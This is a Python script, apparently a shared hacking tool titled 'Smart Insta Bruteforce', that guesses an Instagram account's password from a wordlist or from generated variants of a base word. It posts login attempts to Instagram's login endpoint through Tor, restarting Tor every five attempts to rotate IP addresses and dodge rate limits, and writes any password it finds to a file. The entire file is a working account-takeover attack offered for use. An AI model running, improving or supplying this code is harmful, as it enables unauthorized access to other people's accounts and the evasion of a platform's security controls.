#!/usr/bin/env python3

import os, sys, time, random, requests
from itertools import cycle
from rich.console import Console
from rich.prompt import Prompt
from rich.progress import track

console = Console()
os.system("clear")

# شعار lveunix
console.print("\n[bold red]██╗     ██╗   ██╗███████╗██╗   ██╗███╗   ██╗██╗██╗  ██╗[/]")
console.print("[bold red]██║     ██║   ██║██╔════╝██║   ██║████╗  ██║██║╚██╗██╔╝[/]")
console.print("[bold red]██║     ██║   ██║███████╗██║   ██║██╔██╗ ██║██║ ╚███╔╝ [/]")
console.print("[bold red]██║     ██║   ██║╚════██║██║   ██║██║╚██╗██║██║ ██╔██╗ [/]")
console.print("[bold red]███████╗╚██████╔╝███████║╚██████╔╝██║ ╚████║██║██╔╝ ██╗[/]")
console.print("[bold white]          Smart Insta Bruteforce - by lveunix\n[/]")

# بدء خدمة تور تلقائيًا
console.print("[bold cyan]🧅 Starting Tor service...[/]")
os.system("service tor start > /dev/null 2>&1")
time.sleep(3)

username = Prompt.ask("[bold green]Enter Instagram username")
wordlist_path = Prompt.ask("[bold cyan]Enter wordlist path or press ENTER to generate passwords")

# كلمة أساسية لو ما فيه وورد ليست
base_word = None
passwords = []

if wordlist_path.strip() == "":
    base_word = Prompt.ask("[bold green]Enter base word to generate passwords")
    symbols = ['!', '@', '#', '$', '%', '_']
    numbers = ['123', '2024', '1', '007', '321', '11', '777']
    
    def generate_passwords(base):
        while True:
            mix = base + random.choice(numbers) + random.choice(symbols)
            if 8 <= len(mix) <= 12:
                yield mix
    password_gen = generate_passwords(base_word)
else:
    if not os.path.isfile(wordlist_path):
        console.print("[bold red]❌ Wordlist file not found!")
        sys.exit(1)
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
    password_gen = cycle(passwords)

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest",
})

proxies = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

# تأكيد الاتصال بـ Tor
def check_tor():
    try:
        ip = session.get("http://httpbin.org/ip", proxies=proxies, timeout=10).json()["origin"]
        console.print(f"[bold green]🧅 Connected to Tor: [white]{ip}")
        return True
    except:
        console.print("[bold red]❌ Tor not working. Start manually if needed.")
        return False

if not check_tor():
    sys.exit(1)

login_url = "https://www.instagram.com/accounts/login/ajax/"
attempts = 0

console.print(f"\n[bold cyan]🔐 Starting attack on: [white]{username}[/]")

# محاولة لا نهائية
for password in password_gen:
    time.sleep(random.uniform(1.5, 2.8))
    try:
        session.get("https://www.instagram.com", proxies=proxies, timeout=10)
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        res = session.post(login_url, data=payload, proxies=proxies, timeout=15)

        if '"authenticated":true' in res.text:
            console.print(f"\n[bold green]✅ Password found: [white]{password}")
            with open("found.txt", "w") as f:
                f.write(f"{username}:{password}\n")
            break
        elif 'checkpoint_url' in res.text:
            console.print(f"\n[bold yellow]⚠️ Checkpoint triggered. Possible password: {password}")
            with open("found.txt", "w") as f:
                f.write(f"{username}:{password} [checkpoint]\n")
            break
        else:
            console.print(f"[bold red]❌ {password}")
    except Exception as e:
        console.print(f"[bold red]⚠️ Error: {e}")
    
    attempts += 1
    if attempts % 5 == 0:
        console.print("[bold blue]🔁 Switching IP via Tor...")
        os.system("service tor restart > /dev/null 2>&1")
        time.sleep(5)